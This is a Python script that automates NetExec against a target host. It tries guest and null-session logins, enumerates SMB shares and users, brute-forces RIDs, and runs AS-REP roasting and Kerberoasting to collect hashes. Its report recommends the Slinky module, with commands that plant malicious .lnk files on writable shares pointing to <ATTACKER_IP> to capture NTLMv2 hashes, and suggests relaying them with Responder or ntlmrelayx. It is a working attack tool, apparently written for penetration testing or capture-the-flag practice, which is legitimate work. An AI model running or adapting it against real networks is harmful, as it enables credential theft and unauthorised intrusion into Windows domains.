#!/usr/bin/env python3
import subprocess
import sys
import argparse
import shutil
import re
from datetime import datetime

# --- Module and Attack Configurations ---
# Removed empty string ("") since base command is now tested separately
ENUM_FLAGS = {
    "smb": ["--shares", "--users", "--groups", "--pass-pol", "--rid-brute"],
    "wmi": [],  # WMI has limited enumeration flags in current NXC
    "winrm": [],  # WinRM groups/sessions moved to other protocols
    "mssql": [],  # Most MSSQL flags require auth; -M mssql_priv needs valid login
    "ldap": [
        "--trusted-for-delegation", 
        "--password-not-required", 
        "--users",
        "--asreproast hashes_asrep.txt",
        "--kerberoasting hashes_kerb.txt"
    ],
    "ssh": [], "rdp": [], "vnc": [], "ftp": []
}

# Flags that require Kerberos and may fail due to clock skew
KERBEROS_FLAGS = ["--asreproast", "--kerberoasting"]

def get_time_offset_from_target(target):
    """Try to extract time information from target SMB/LDAP response."""
    try:
        # Query SMB to get timestamp from server response
        result = subprocess.run(
            ["nxc", "smb", target],
            capture_output=True,
            text=True,
            timeout=10
        )
        # SMB responses often include timestamps that could help
        # For now, return None and let system sync handle it
        return None
    except Exception:
        return None

def sync_time_with_target(target):
    """Synchronize local time with target using various methods."""
    # Try multiple time sync methods
    
    # Method 1: Try ntpdate (legacy but still useful)
    if shutil.which("ntpdate"):
        try:
            result = subprocess.run(
                ["sudo", "ntpdate", target],
                capture_output=True,
                text=True,
                timeout=10
            )
            if result.returncode == 0:
                print(f"\033[1;32m[+] Time synchronized with target using ntpdate\033[0m")
                return True
        except Exception as e:
            print(f"\033[1;33m[*] ntpdate sync failed: {e}\033[0m")
    
    # Method 2: Try timedatectl with systemd-timesyncd (modern approach)
    if shutil.which("timedatectl"):
        try:
            # This requires NTP to be configured, but we can try to get the offset
            result = subprocess.run(
                ["timedatectl", "set-ntp", "true"],
                capture_output=True,
                text=True,
                timeout=10
            )
            print(f"\033[1;32m[+] NTP sync enabled/verified with timedatectl\033[0m")
            return True
        except Exception as e:
            print(f"\033[1;33m[*] timedatectl sync failed: {e}\033[0m")
    
    # Method 3: Try to get target time via SMB/LDAP timestamp
    try:
        # Use nxc to query and extract time from response
        result = subprocess.run(
            ["nxc", "smb", target, "-u", "dummy", "-p", "dummy"],
            capture_output=True,
            text=True,
            timeout=10
        )
        if "Build" in result.stdout:
            print(f"\033[1;33m[*] Could not directly sync time, but target is responsive\033[0m")
            return False
    except Exception:
        pass
    
    return False

def run_and_stream(cmd, file_handle, use_faketime=False, target=None):
    """Execute command, print to terminal and write to file in real time.
       Returns full output as string for later analysis."""
    
    # If using faketime, wrap the command
    if use_faketime and target:
        if shutil.which("faketime"):
            # First, attempt to sync time with target
            print(f"\033[1;33m[*] Attempting to synchronize system time with target...\033[0m")
            sync_time_with_target(target)
            
            # Build faketime command - use "now" or try to get target time
            nxc_cmd_str = " ".join(f"'{c}'" if ' ' in c or '!' in c or '&' in c else c for c in cmd)
            
            # Try to get target time from SMB header
            target_time_offset = get_time_offset_from_target(target)
            if target_time_offset:
                shell_cmd = f'faketime "{target_time_offset}" {nxc_cmd_str}'
                print(f"\033[1;35m[*] Retrying with faketime using target time offset:\033[0m")
            else:
                # Fallback: sync time first, then retry
                shell_cmd = f'{nxc_cmd_str}'
                print(f"\033[1;35m[*] Retrying after time sync:\033[0m")
            
            print(f"\033[1;34m[*] Executing:\033[0m {shell_cmd}")
            file_handle.write(f"### Command (with time sync): `{shell_cmd}`\n\n```bash\n")
            file_handle.flush()
            
            full_output = ""
            try:
                process = subprocess.Popen(
                    shell_cmd,
                    shell=True,
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.STDOUT, 
                    text=True, 
                    bufsize=1
                )
                for line in process.stdout:
                    print(line, end="")
                    file_handle.write(line)
                    file_handle.flush()
                    full_output += line
                process.wait()
            except Exception as e:
                error_msg = f"Execution ERROR: {str(e)}\n"
                print(f"\033[1;31m{error_msg}\033[0m")
                file_handle.write(error_msg)
                full_output += error_msg
            
            file_handle.write("```\n\n---\n\n")
            file_handle.flush()
            return full_output
        else:
            print(f"\033[1;33m[*] faketime not found. Proceeding without it.\033[0m")
    
    # Normal execution
    cmd_str = " ".join(cmd)
    print(f"\n\033[1;34m[*] Executing:\033[0m {cmd_str}")
    
    file_handle.write(f"### Command: `{cmd_str}`\n\n```bash\n")
    file_handle.flush()

    full_output = ""
    try:
        process = subprocess.Popen(
            cmd, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.STDOUT, 
            text=True, 
            bufsize=1
        )

        for line in process.stdout:
            print(line, end="")          
            file_handle.write(line)     
            file_handle.flush()
            full_output += line

        process.wait()
    except Exception as e:
        error_msg = f"Execution ERROR: {str(e)}\n"
        print(f"\033[1;31m{error_msg}\033[0m")
        file_handle.write(error_msg)
        full_output += error_msg
    
    file_handle.write("```\n\n---\n\n")
    file_handle.flush()
    return full_output

def is_kerberos_flag(flag):
    """Check if flag requires Kerberos authentication."""
    return any(kf in flag for kf in KERBEROS_FLAGS)

def has_clock_skew_error(output):
    """Check if output contains clock skew error."""
    return "clock skew too great" in output.lower() or "krb_ap_err_skew" in output.lower()

def detect_writable_shares(output):
    """Detect SMB shares with WRITE permission from nxc output."""
    writable_shares = []
    for line in output.split('\n'):
        # NXC shows shares with READ,WRITE or WRITE permissions
        if 'WRITE' in line.upper():
            # Extract share name - typically format: SHARENAME   READ,WRITE
            match = re.search(r'\s+(\S+)\s+.*WRITE', line, re.IGNORECASE)
            if match:
                share_name = match.group(1)
                writable_shares.append(share_name)
    return writable_shares

def extract_users_from_rid_brute(output):
    """Extract usernames from rid-brute output."""
    users = []
    for line in output.split('\n'):
        # RID brute output format: SID: S-1-5-21-...-500 (Name: Administrator) (Type: User)
        # Or: 500: DOMAIN\Administrator (SidTypeUser)
        match = re.search(r'\d+:\s*\S+\\(\S+)\s*\(SidTypeUser\)', line)
        if match:
            users.append(match.group(1))
        else:
            # Alternative format: (Name: username)
            match = re.search(r'\(Name:\s*(\S+)\).*\(Type:\s*User\)', line, re.IGNORECASE)
            if match:
                users.append(match.group(1))
    return users

def save_users_to_file(users, auth_user, target):
    """Save discovered users to a timestamped file."""
    if not users:
        return None
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    user_clean = auth_user.replace('\\', '_').replace('/', '_').replace(' ', '_') if auth_user else "anon"
    target_clean = target.replace('.', '_')
    filename = f"user__{user_clean}_{timestamp}.txt"
    
    with open(filename, 'w') as f:
        for user in sorted(set(users)):  # Remove duplicates and sort
            f.write(f"{user}\n")
    
    return filename

def check_responsiveness(output, require_auth):
    """
    Analyze NetExec output to decide whether to continue with flags.
    Returns (Boolean, Reason Message).
    """
    out_lower = output.lower()
    
    # 1. Check if service is down, port is closed or unreachable
    if "connection refused" in out_lower or "timeout" in out_lower or "unreachable" in out_lower:
        return False, "Service down or port closed."
    
    # 2. Check for explicit failures (even if [+] appears alongside)
    if "[-]" in output:
        # Login failures
        if "logon_failure" in out_lower or "status_logon_failure" in out_lower:
            return False, "Authentication failed."
        if "login failed" in out_lower:
            return False, "Login failed."
        # Access denied
        if "access_denied" in out_lower or "status_access_denied" in out_lower:
            return False, "Access denied."
        # LDAP bind required (null session doesn't work for queries)
        if "successful bind must be completed" in out_lower:
            return False, "LDAP requires authenticated bind."
        # SpnegoError (WinRM issue with null)
        if "spnegoerror" in out_lower:
            return False, "SPNEGO authentication error."
        # Generic encoded_data error (RDP with null)
        if "encoded_data must be" in out_lower:
            return False, "Protocol doesn't support null auth."

    # 3. Check for success indicators
    # NetExec uses [+] for login success or Pwn3d! for admin
    if "[+]" in output or "Pwn3d!" in output:
        # Verify it's a real success, not just "anonymous login" marker
        # Check if there's actual data or just acknowledgment
        return True, "Authentication successful."
    
    # 4. For null/guest, [*] with target info means service is responsive
    # But only if no errors were present
    if "[*]" in output and ("name:" in out_lower or "domain:" in out_lower):
        return True, "Service responsive."
            
    return False, "No valid response from service."

def main():
    parser = argparse.ArgumentParser(description="NXC Automation - Smart Check & Roasting")
    parser.add_argument("protocol_or_target", help="Protocol (e.g., smb) or Target IP (Full Check)")
    parser.add_argument("target_optional", nargs='?', help="Target IP (if protocol was specified)")
    parser.add_argument("-u", "--user", help="Target user")
    parser.add_argument("-p", "--password", help="User password")

    args = parser.parse_args()

    # Define whether we test only 1 protocol or all
    if args.protocol_or_target in ENUM_FLAGS:
        protocolos = [args.protocol_or_target]
        target = args.target_optional
    else:
        protocolos = list(ENUM_FLAGS.keys())
        target = args.protocol_or_target

    if not target or target.startswith("-"):
        print("\n[!] ERROR: Target not specified. Example: ./nxc-auto.py 10.10.11.1 -u user -p pass")
        sys.exit(1)

    # Build report filename with optional username
    target_clean = target.replace('.', '_')
    if args.user:
        user_clean = args.user.replace('\\', '_').replace('/', '_').replace(' ', '_')
        report_name = f"nxc_report_{target_clean}_{user_clean}.md"
    else:
        report_name = f"nxc_report_{target_clean}_anon.md"
    
    require_auth = args.user is not None
    
    # Track findings for final recommendations
    all_writable_shares = []  # Shares with WRITE permission
    all_discovered_users = []  # Users from rid-brute
    
    # Define auth modes to try when no credentials provided
    if require_auth:
        auth_modes = [(args.user, args.password, "Authenticated")]
    else:
        # Try guest first, then null session as fallback
        auth_modes = [
            ("guest", "", "Guest"),
            ("", "", "Null Session")
        ]
    
    with open(report_name, "w") as f:
        f.write(f"# NXC Smart Report - Target: {target}\n\n")
        
        for proto in protocolos:
            print(f"\n\033[1;32m[{"="*40}]\033[0m")
            print(f"\033[1;32m[>>>] Starting protocol: {proto.upper()}\033[0m")
            f.write(f"## Protocol: {proto.upper()}\n\n")
            
            # ---------------------------------------------------------
            # PHASE 1: Base Check (Connectivity and Authentication Test)
            # ---------------------------------------------------------
            working_auth = None
            
            for auth_user, auth_pass, auth_label in auth_modes:
                base_cmd = ["nxc", proto, target, "-u", auth_user, "-p", auth_pass]
                
                print(f"\033[1;33m[*] Phase 1: Testing {auth_label} access...\033[0m")
                output = run_and_stream(base_cmd, f)
                
                # Response analysis
                should_continue, reason = check_responsiveness(output, require_auth)
                
                if should_continue:
                    working_auth = (auth_user, auth_pass, auth_label)
                    print(f"\033[1;32m[+] {auth_label}: {reason}\033[0m")
                    break
                else:
                    print(f"\033[1;31m[!] {auth_label}: {reason}\033[0m")
                    f.write(f"> ⚠️ **{auth_label}:** {reason}\n\n")
            
            if not working_auth:
                print(f"\033[1;31m[!] No working auth method. Skipping deep enumeration of {proto.upper()}.\033[0m")
                f.write(f"> 🛑 **Warning:** No authentication method worked. Advanced flags were skipped.\n\n---\n\n")
                continue # Skip to next protocol
            
            auth_user, auth_pass, auth_label = working_auth
            base_cmd = ["nxc", proto, target, "-u", auth_user, "-p", auth_pass]
            
            # ---------------------------------------------------------
            # PHASE 2: Deep Enumeration and Attacks (If Phase 1 passed)
            # ---------------------------------------------------------
            print(f"\033[1;32m[+] Using {auth_label} for data extraction...\033[0m")
            for flag in ENUM_FLAGS[proto]:
                cmd = base_cmd.copy()
                cmd.extend(flag.split())
                output = run_and_stream(cmd, f)
                
                # Track writable shares for SMB --shares
                if proto == "smb" and "--shares" in flag:
                    writable = detect_writable_shares(output)
                    if writable:
                        all_writable_shares.extend(writable)
                        print(f"\033[1;33m[!] Found writable shares: {', '.join(writable)}\033[0m")
                
                # Track users from rid-brute
                if proto == "smb" and "--rid-brute" in flag:
                    users = extract_users_from_rid_brute(output)
                    if users:
                        all_discovered_users.extend(users)
                        print(f"\033[1;33m[!] Discovered {len(users)} users via RID brute\033[0m")
                
                # If Kerberos flag failed due to clock skew, retry with faketime
                if is_kerberos_flag(flag) and has_clock_skew_error(output):
                    print(f"\033[1;33m[!] Clock skew detected. Attempting time sync...\033[0m")
                    f.write("> ⚠️ **Clock skew detected.** Retrying with faketime...\n\n")
                    run_and_stream(cmd, f, use_faketime=True, target=target)
        
        # End of protocol loop - write final recommendations to report
        f.write("\n## Final Recommendations\n\n")
        
        # Save users file if any were discovered
        if all_discovered_users:
            users_file = save_users_to_file(all_discovered_users, args.user, target)
            if users_file:
                print(f"\n\033[1;32m[+] Users saved to: {users_file}\033[0m")
                f.write(f"### Discovered Users\n\n")
                f.write(f"> 📋 **{len(set(all_discovered_users))} unique users** saved to `{users_file}`\n\n")
                f.write("**User list:**\n```\n")
                for user in sorted(set(all_discovered_users)):
                    f.write(f"{user}\n")
                f.write("```\n\n")
        
        # Slinky recommendation if writable shares found
        if all_writable_shares:
            unique_shares = list(set(all_writable_shares))
            print(f"\n\033[1;35m[!] RECOMMENDATION: Writable shares detected!\033[0m")
            print(f"\033[1;35m    Consider using Slinky for exploitation:\033[0m")
            print(f"\033[1;35m    https://github.com/JoelGMSec/Slinky\033[0m")
            print(f"\033[1;35m    Writable shares: {', '.join(unique_shares)}\033[0m")
            
            f.write("### Slinky Exploitation Opportunity\n\n")
            f.write("> ⚠️ **WRITABLE SHARES DETECTED!**\n\n")
            f.write(f"The following shares have **WRITE** permissions:\n")
            for share in unique_shares:
                f.write(f"- `{share}`\n")
            f.write(f"\n**Recommended Module:** NXC Slinky (`-M slinky`)\n\n")
            f.write("The slinky module creates malicious .lnk files to capture NTLMv2 hashes when users browse the share.\n\n")
            f.write("**Example usage:**\n```bash\n")
            f.write(f"# Create malicious .lnk pointing to attacker\n")
            for share in unique_shares:
                f.write(f"nxc smb {target} -u '<USER>' -p '<PASS>' -M slinky -o NAME=desktop.lnk SERVER=<ATTACKER_IP>\n")
            f.write(f"\n# Cleanup after capturing hashes\n")
            f.write(f"nxc smb {target} -u '<USER>' -p '<PASS>' -M slinky -o NAME=desktop.lnk SERVER=<ATTACKER_IP> CLEANUP=True\n")
            f.write("```\n\n")
            f.write("> 💡 **Tip:** Run Responder or ntlmrelayx on your attacker machine to capture/relay the hashes.\n\n")

    print(f"\n\033[1;32m[+] Process finished successfully! Log: {report_name}\033[0m")

if __name__ == "__main__":
    main()